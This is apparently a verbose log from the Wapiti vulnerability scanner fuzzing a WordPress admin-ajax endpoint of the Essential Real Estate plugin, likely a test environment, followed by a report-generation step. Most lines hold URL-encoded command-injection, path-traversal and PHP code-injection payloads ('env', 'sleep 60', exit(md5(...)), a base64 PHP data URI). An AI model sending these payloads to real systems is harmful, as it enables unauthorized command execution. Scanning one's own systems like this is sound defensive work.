2024-03-21 21:14:15.967 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%3Benv%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:16.740 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%7Cenv%7C&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:17.513 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%3Benv%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:18.286 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%3Benv%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:19.058 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:19.828 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%3Benv%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:20.599 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%0Aenv%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:21.369 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%26set%26&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:22.140 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=set&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:22.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=env&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:23.680 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%2Fe%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:24.451 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:25.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:25.993 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:26.764 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:27.535 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:28.307 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:29.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:29.849 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:30.620 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:31.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:32.161 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:32.932 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:33.702 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:34.474 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%60%29%60&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:35.252 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%60sleep%2060%60&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:36.021 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%3Bsleep%2060%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:36.792 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=a%7Csleep%2060%3B&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:37.564 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%26ping%20-n%2025%20127.0.0.1%26&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:14:38.341 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%3Benv%3B (0)
2024-03-21 21:14:39.104 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%7Cenv%7C (0)
2024-03-21 21:14:39.917 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%3Benv%3B (0)
2024-03-21 21:14:40.732 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%3Benv%3B (0)
2024-03-21 21:14:41.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 21:14:42.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%3Benv%3B (0)
2024-03-21 21:14:43.183 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%0Aenv%3B (0)
2024-03-21 21:14:43.990 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%26set%26 (0)
2024-03-21 21:14:44.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=set (0)
2024-03-21 21:14:45.612 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=env (0)
2024-03-21 21:14:46.424 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2Fe%00 (0)
2024-03-21 21:14:47.220 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:47.984 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:48.798 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:49.609 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:50.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:51.135 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:51.896 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:52.659 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:53.475 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:54.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:55.048 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:14:55.860 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:14:56.627 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 21:14:57.440 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%60%29%60 (0)
2024-03-21 21:14:58.260 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%60sleep%2060%60 (0)
2024-03-21 21:14:59.075 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%3Bsleep%2060%3B (0)
2024-03-21 21:14:59.899 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=a%7Csleep%2060%3B (0)
2024-03-21 21:15:00.713 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 21:15:01.524 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 21:15:01.537 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:15:01.556 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 21:15:01.568 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:15:02.379 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 21:15:02.403 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//essential-real-estate.json/
2024-03-21 21:15:02.403 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//essential-real-estate.json/web_03212024_2111.html with a browser to see this report.
